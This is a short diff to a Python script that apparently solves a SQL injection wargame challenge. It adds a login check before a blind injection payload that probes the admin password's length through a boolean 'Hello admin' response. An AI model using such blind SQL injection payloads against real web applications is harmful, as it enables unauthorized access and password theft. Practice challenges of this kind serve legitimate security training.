@@ -30,6 +30,10 @@ def main():
         cook = {'PHPSESSID': getpass(
             prompt='enter PHPSESSID cookie: ')}
 
+    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
+        print('you need to login in browser')
+        exit(1)
+
     payload = "'||length(pw)>%s&&id like 0x61646d696e#"
     len_of_key = los.find_key_len(url, payload, 'pw', 'Hello admin', cook)
 
